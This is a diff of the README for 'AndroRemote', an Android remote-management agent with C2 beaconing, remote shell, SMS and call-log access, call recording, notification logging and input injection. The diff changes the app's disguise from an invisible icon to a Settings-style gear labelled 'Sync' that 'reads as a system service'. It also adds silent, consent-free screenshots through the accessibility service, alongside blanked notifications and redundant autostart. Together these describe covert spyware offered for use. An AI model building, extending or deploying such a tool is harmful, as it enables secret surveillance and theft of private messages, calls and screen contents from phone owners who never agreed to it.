@@ -1,6 +1,6 @@
 # AndroRemote
 
-Headless Android 15 remote-management agent + host-side tooling. The APK has **no GUI and is hidden**: no launcher entry, blank app icon, `Sync` label, no recents entry, no visible activity, blank status-bar icon with an empty IMPORTANCE_MIN notification. Everything is driven from your terminal.
+Headless Android 15 remote-management agent + host-side tooling. The APK has **no GUI**: a Settings-style gear launcher icon with the `Sync` label, no recents entry, no visible activity, blank status-bar icon with an empty IMPORTANCE_MIN notification. Everything is driven from your terminal.
 
 ```
 ┌──────────────┐   adb forward tcp:8741→tcp:8740   ┌─────────────────────────┐
@@ -24,7 +24,7 @@ Two channels, both always active when configured:
 |---|---|---|
 | Remote shell | `SHELL` | app-uid (`u0_aXXX`), `sh -c` |
 | Files | `LS` `GET` `PUT` / `GETB64` `PUTB64` | raw (direct) / base64 (C2), ≤50MB / ≤32MB |
-| Screenshot | `SCREEN` / `SCREENB64` | agent-side via MediaProjection (see below) |
+| Screenshot | `SCREEN` / `SCREENB64 [maxdim]` | agent-side via MediaProjection (see below); maxdim caps the long edge (360–2160) — the reply gains the real `WxH` when scaled, so clients map taps correctly |
 | SMS receive | `SmsReceiver` → `LOG` `SMSLOG` | written to app logs dir |
 | SMS send | `SMS <num> <text>` | requires `SEND_SMS` |
 | Call log | `CALLLOG [n]` | in/out/missed, number, date, duration |
@@ -60,7 +60,7 @@ Two channels, both always active when configured:
 | `androremote.py` | adb-direct CLI wrapper (backward compatibility) |
 | `build.sh` | APK build (optional C2 URL argument) |
 | `app/src/main/java/com/ohmpi/androremote/` | `RemoteService` (TCP server + all ops), `C2Beacon` (HTTP beacon), `CaptureService` (MediaProjection screenshots), `MainActivity` (invisible; permissions + capture consent once, then finishes), `RemoteAccessibilityService` (input injection + install auto-confirm + keep-alive), `UpdateReceiver` (installer status), `NotifsListener` (notification log), `BootReceiver`, `SmsReceiver` |
-| `app/src/main/res/` | transparent launcher + notification icons (stealth), `values/c2.xml` (baked C2 URL) |
+| `app/src/main/res/` | gear launcher icon, transparent notification icon, `values/c2.xml` (baked C2 URL) |
 | `keystore/` | your own signing key (gitignored, generated on first `./build.sh`) |
 | `build/apk/androremote.apk` | output |
 
@@ -147,20 +147,15 @@ python3 androremote.py ping                      # expect: PONG
 ```
 
 - `-g` = "request all permissions once on start" without any dialogs.
-- The app is **hidden**: no MAIN/LAUNCHER intent-filter, so it never appears in the app drawer. Reach it only explicitly:
-  ```sh
-  python3 androremote.py launch        # = am start MainActivity + adb forward
-  # or: adb shell am start -n com.ohmpi.androremote/.MainActivity
-  ```
-  Launching once requests any missing permissions via system dialogs **and** the one-time MediaProjection consent for screenshots, then finishes immediately. It stays hidden from recents (`excludeFromRecents`, `noHistory`, `Theme.NoDisplay`).
+- The app shows in the launcher as "Sync" with a Settings-style gear icon; tapping runs `MainActivity` (permission dialogs on first launch, agent start, finish). It stays out of recents (`excludeFromRecents`, `noHistory`, translucent theme).
 - It still shows under Settings → Apps (impossible to hide for a third-party app) and its two FGS notifications are required by Android — they use `IMPORTANCE_MIN` and `VISIBILITY_SECRET` (content hidden on lockscreen).
 - Autostart is quadruple-redundant: `BootReceiver` (`BOOT_COMPLETED` **and** `MY_PACKAGE_REPLACED` — restart after every self-update), the accessibility service's `onServiceConnected` re-start, and `WatchdogReceiver` — a 15-minute wake-up alarm, `KeepAliveJob` — a persisted periodic JobScheduler job that restarts `RemoteService` if the process died (START_STICKY can be a no-op on aggressive OEMs).
 - **Force-stopped apps (`stopped=true`) never receive BOOT_COMPLETED** until launched once. Don't `am force-stop` the app if you rely on boot autostart.
 
-- First launch of the app shows the system screen-capture consent once. `CaptureService` (FGS type `mediaProjection`) holds the projection; the mirror `VirtualDisplay` + `ImageReader` exist **only during a capture** (a persistent mirror forces SurfaceFlinger to composite every frame at display rate, which lags the whole phone) and serve on-demand JPEG captures — no adb, works over the C2 tunnel.
+- Screenshots are consent-free by default: `RemoteAccessibilityService` takes them via `AccessibilityService.takeScreenshot` (API 33+, needs only the accessibility service — no MediaProjection prompt, silent, nothing written to MediaStore). `CaptureService` (FGS type `mediaProjection`, one-time consent) is the fallback: it owns a single persistent mirror `VirtualDisplay` — Android 14+ permits only one per consent, so it is never recreated — with its surface detached between captures (a permanently attached mirror forces SurfaceFlinger to composite every frame at display rate, which lags the phone). Static screenshots only, no recording. API 28–32 devices fall back to the global-action + MediaStore scan (visible flash).
 
-- The consent token is valid for the process lifetime. **After reboot or app-process death, screenshots need one app re-launch** to re-consent; every other feature keeps working headless.
-- If projection is inactive, the CLI falls back to `adb exec-out screencap`.
+- With projection granted, its consent token is valid for the process lifetime. **After reboot or app-process death, projection needs one app re-launch** to re-consent; accessibility screenshots and every other feature keep working headless.
+- If both screenshot paths are down, the CLI falls back to `adb exec-out screencap`.
 
 ### Call recording ("listen call")
 
@@ -290,7 +285,8 @@ SHELL <cmd> | LS [path] | SMS <number> <text> | CALL <number> | RECORD <secs>
 PUT <size> <path>\n<raw bytes>       # then response
 GET <path>                           # "OK <len> <name>\n<raw bytes>
 SCREEN                               # "OK <len> screen.png\n<raw bytes> (projection)
-SCREENB64 | GETB64 <b64path> | PUTB64 <b64path> <b64data>   # base64 variants
+SCREENB64 [maxdim]                   # "OK <len> <b64>"; with maxdim: "OK <len> <WxH> <b64>"
+GETB64 <b64path> | PUTB64 <b64path> <b64data>   # base64 variants
 TAP x y | SWIPE x1 y1 x2 y2 [ms] | SETTEXT text | GACTION name  # accessibility
 INSTALL <path> | INSTALLSTATUS                                 # self-update
 WAKE | VOL | CLIPSET | CLIPGET | TORCH | VIBRATE | APPS | STARTAPP | NOTIFS | FASTPOLL
@@ -317,14 +313,8 @@ Read via `log` / `smslog` on either channel.
 The APK is fully disguised on-device:
 
 - **App label**: `Sync` — matches the notification channel name, reads as a system service in Settings → Apps.
-- **Launcher icon**: adaptive icon with a fully transparent background and foreground (`ic_launcher_bg`, `avatar_foreground`) — renders blank wherever icons appear; no default/gear fallback because a valid (invisible) drawable is set.
+- **Launcher icon**: adaptive icon — solid Settings-style blue (`ic_launcher_bg`) with a white Material gear (`ic_launcher_fg`); the drawer entry reads as a system-settings companion.
 - **Notification small icon**: `ic_notify` — fully transparent, so the status-bar icon is a blank pixel; the FGS notification itself is `IMPORTANCE_MIN` + `PRIORITY_MIN` + `VISIBILITY_SECRET` with empty title/text, so it has no status-bar presence and only a blank row deep in the expanded shade.
-- No MAIN/LAUNCHER intent-filter: the app never appears in the launcher drawer or home screen.
-
-## Remote control (accessibility)
-
-`RemoteAccessibilityService` injects input and reads installer dialogs. Enable **once** per device over adb:
-
 ```sh
 python3 androremote.py axenable    # settings put secure enabled_accessibility_services + appops REQUEST_INSTALL_PACKAGES allow
 python3 androremote.py perms       # expect accessibility=enabled install_unknown=granted
